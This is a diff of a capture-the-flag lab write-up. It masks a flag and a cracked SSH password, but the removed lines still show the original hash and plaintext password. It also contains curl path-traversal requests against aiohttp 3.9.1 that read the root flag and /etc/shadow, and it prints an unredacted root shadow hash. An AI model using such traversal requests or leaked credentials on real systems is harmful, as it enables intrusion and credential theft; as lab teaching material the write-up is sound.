@@ -200,7 +200,7 @@ So copy it and store in local to analyze and the go to https://inloop.github.io/
 
 
 ```
-rosa:63ed86ee9f624c7b14f1d4f43dc251a5
+userflag:63ed86e********
 ```
 
 After cracking the MD5 hash on CrackStation, I obtained the following plaintext password:
@@ -208,7 +208,7 @@ After cracking the MD5 hash on CrackStation, I obtained the following plaintext 
 ![](attachment/d2fe7632ffcd0ede2092fc06eb355cca.png)
 
 ```
-rosa:unicorniosrosados
+rosa:u**********
 ```
 ### SSH Access
 With the cracked credentials, I attempted to establish an SSH connection to the machine as the user rosa. This provided access to additional internal services. Port Forwarding and Service Exploration
@@ -241,7 +241,8 @@ The service running on port 8080 uses aiohttp version 3.9.1, which is vulnerable
 ```shell
 ┌──(kali㉿kali)-[~]
 └─$ curl -s --path-as-is http://localhost:8080/assets/../../../../root/root.txt
-6401b9e5a23e0b20fecead6965d9f51e
+6401b9e5a23e0b******
+
 ┌──(kali㉿kali)-[~]
 └─$ curl -s --path-as-is http://localhost:8080/assets/../../../../etc/shadow
 root:$6$51.cQv3bNpiiUadY$0qMYr0nZDIHuPMZuR4e7Lirpje9PwW666fRaPKI8wTaTVBm5fgkaBEojzzjsF.jjH0K0JWi3/poCT6OfBkRpl.:19891:0:99999:7:::
